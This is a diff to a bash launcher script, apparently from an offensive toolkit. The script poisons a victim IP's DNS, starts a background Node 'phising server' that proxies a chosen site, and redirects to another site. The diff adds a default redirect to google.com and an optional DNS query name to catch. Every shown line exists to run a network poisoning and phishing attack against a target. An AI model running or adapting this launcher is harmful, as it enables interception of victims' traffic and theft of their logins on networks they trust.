@@ -10,14 +10,24 @@ if [ -z "$2" ]
 fi
 SSITE=$2
 
-if [ -z "$3" ]
-  then echo "Please specify redirect site ip, e.g. http://www.google.com/ "; exit 0
-fi
-RSITE=$3
 
-echo "Poisoning $VIP, proxying $SSITE, redirecting to $RSITE"
+if [ -z "$3" ]
+then
+  RSITE="https://www.google.com/"
+else
+  RSITE=$3
+fi
+
+if [ -z "$4" ]
+then
+  NSITE=$SSITE
+else
+  NSITE=$4
+fi
+
+echo "Poisoning $VIP, catching dns query $NSITE, proxying $SSITE, redirecting to $RSITE"
 
 # Start node phising server
-nohup node node/node.js "$SSITE" "$RSITE" &
+nohup node node/node.js "$NSITE" "$RSITE" &
 
 python py/main.py -v "$VIP" -s "$SSITE"
